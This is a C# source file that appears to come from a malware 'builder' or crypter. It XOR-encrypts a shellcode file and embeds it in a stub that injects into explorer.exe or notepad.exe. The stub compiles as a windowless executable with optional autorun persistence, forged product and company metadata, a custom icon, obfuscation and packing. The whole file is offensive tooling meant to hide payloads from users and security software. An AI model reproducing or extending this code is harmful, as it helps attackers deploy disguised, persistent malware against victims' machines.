using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace Builder.Core
{
    class Compilator
    {
        #region Compile Init
        public static string PerformCompilate
            (
            string targetFile, string outPath, bool a64, bool a86, 
            string IconFile, string AssemblyFile, bool UseObfuscate, bool UseAutorun, bool UseCompress, string injectProcess
            )
        {
            if (File.Exists(targetFile))
            {
                byte[] RandomXor = Helper.GenerateRandomBytes(32);

                byte[] bytePayload = Helper.EncryptShellcodeFromFile(targetFile, RandomXor);

                string result = CompileStub(bytePayload, RandomXor, outPath, a64, a86, IconFile, AssemblyFile, UseObfuscate, UseAutorun, UseCompress, injectProcess);
                return result;
            }

            return "Failed to compile!\nFile does not exists. . .";
        }
        #endregion

        #region Compile Algorithm
        public static string CompileStub
            (
            byte[] encPayload, byte[] key, string outPath, bool a64, bool a86, 
            string IconFile, string AssemblyFile, bool UseObfuscate, bool UseAutorun, bool UseCompress, string injectProcess
            )
        {
            string stubSourceCode = Properties.Resources.stub;

            if (injectProcess.Contains("explorer"))
            { 
                stubSourceCode = stubSourceCode.Replace("%process_to_inject%", "C:\\\\Windows\\\\explorer.exe"); 
            }

            else 
            { 
                stubSourceCode = stubSourceCode.Replace("%process_to_inject%", "c:\\\\windows\\\\system32\\\\notepad.exe"); 
            }


            string hexArray = Helper.GenerateHexArray(encPayload);

            stubSourceCode = Regex.Replace(
                stubSourceCode,
                @"public static byte\[\] Payload = new byte\[\] \{.*?\};",
                "public static byte[] Payload = " + hexArray,
                RegexOptions.Singleline
            );

            string newKey = "public static byte[] Key = new byte[] { " + string.Join(", ", key.Select(b => "0x" + b.ToString("X2"))) + " };";
            stubSourceCode = Regex.Replace(
                stubSourceCode,
                @"public static byte\[\] Key = new byte\[\] \{.*?\};",
                newKey,
                RegexOptions.Singleline
            );

            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = outPath,
                CompilerOptions = "/target:winexe",
                IncludeDebugInformation = false
            };

            if (a64)
            { 
                parameters.CompilerOptions += " /platform:x64"; 
            }

            if (a86) 
            { 
                parameters.CompilerOptions += " /platform:x86"; 
            }

            if (UseAutorun)
            {
                parameters.CompilerOptions += " /define:UseAutorun";
            }

            if (!string.IsNullOrEmpty(AssemblyFile) && File.Exists(AssemblyFile))
            {
                parameters.CompilerOptions += " /define:UseAssembly";
                var metadata = File.ReadAllLines(AssemblyFile);

                string title = metadata.Length > 0 ? metadata[0] : "N/A";
                string description = metadata.Length > 1 ? metadata[1] : "N/A";
                string company = metadata.Length > 2 ? metadata[2] : "N/A";
                string product = metadata.Length > 3 ? metadata[3] : "N/A";
                string copyright = metadata.Length > 4 ? metadata[4] : "N/A";
                string trademarks = metadata.Length > 5 ? metadata[5] : "N/A";
                string fileVersion = metadata.Length > 6 ? metadata[6] : "N/A";
                string productVersion = metadata.Length > 7 ? metadata[7] : "N/A";

                stubSourceCode = stubSourceCode.Replace("%TITLE%", title);
                stubSourceCode = stubSourceCode.Replace("%DESC%", description);
                stubSourceCode = stubSourceCode.Replace("%COMPANY%", company);
                stubSourceCode = stubSourceCode.Replace("%PRODUCT%", product);
                stubSourceCode = stubSourceCode.Replace("%COPYRIGHT%", copyright);
                stubSourceCode = stubSourceCode.Replace("%TRADEMARK%", trademarks);
                stubSourceCode = stubSourceCode.Replace("%VERSION%", productVersion);
                stubSourceCode = stubSourceCode.Replace("%FILE_VERSION%", fileVersion);
            }

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
            parameters.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
            parameters.ReferencedAssemblies.Add("System.Linq.dll");

            if (!string.IsNullOrEmpty(IconFile) && File.Exists(IconFile))
            {
                parameters.CompilerOptions += $" /win32icon:\"{IconFile}\"";
            }

            using (CSharpCodeProvider codeProvider = new CSharpCodeProvider())
            {
                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, stubSourceCode);

                if (results.Errors.Count > 0)
                {
                    foreach (CompilerError error in results.Errors)
                    {
                        Console.WriteLine($"Error compilation: {error.ErrorText}");
                        Console.WriteLine($"File: {error.FileName}");
                        Console.WriteLine($"String: {error.Line}, Column: {error.Column}");
                        Console.WriteLine($"ID Error: {error.ErrorNumber}");
                        Console.WriteLine($"This {(error.IsWarning ? "Warning" : "Error")}");
                        Console.WriteLine(new string('-', 50));
                    }
                    throw new InvalidOperationException("Failed to compilate.");
                }
            }

            if (UseObfuscate)
            {
                Obfuscator.PerformObfuscation(outPath);
            }

            if (UseCompress)
            {
                PackerCompilator.PerformPacking(outPath, UseObfuscate, IconFile, AssemblyFile);
            }

            return $"Compiling successfull!\nBuild-File: {Path.GetFileNameWithoutExtension(outPath)}";
        }
        #endregion
    }
}
